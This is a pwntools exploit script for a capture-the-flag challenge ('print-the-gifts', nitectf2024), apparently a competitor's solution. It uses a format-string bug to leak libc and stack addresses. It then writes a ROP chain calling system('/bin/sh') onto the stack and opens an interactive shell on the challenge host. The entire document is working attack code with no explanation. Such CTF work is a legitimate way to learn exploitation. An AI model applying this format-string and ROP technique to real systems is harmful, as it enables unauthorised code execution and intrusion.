from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+167
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sla(b'>', b'%43$p')
ru("Santa brought you a ")
libc.address = int(rl(), 16) - 0x27305
sl(b'y')
sla(b'>', b'%27$p')
ru("Santa brought you a ")
stack_addr = int(rl(), 16) - 0x110
sl(b'y')

payload = fmtstr_payload(8, {stack_addr: qgad(libc, "rdi")}, write_size='short')
sl(payload)
sl(b'y')
payload = fmtstr_payload(8, {stack_addr + 0x8: binsh(libc)}, write_size='short')
sl(payload)
sl(b'y')
payload = fmtstr_payload(8, {stack_addr + 0x10: gad(libc, ['ret'])}, write_size='short')
sl(payload)
sl(b'y')
payload = fmtstr_payload(8, {stack_addr + 0x18: libc.symbols['system']}, write_size='short')
sl(payload)
sl(b'n')

ic(hex(libc.address))


io.interactive()
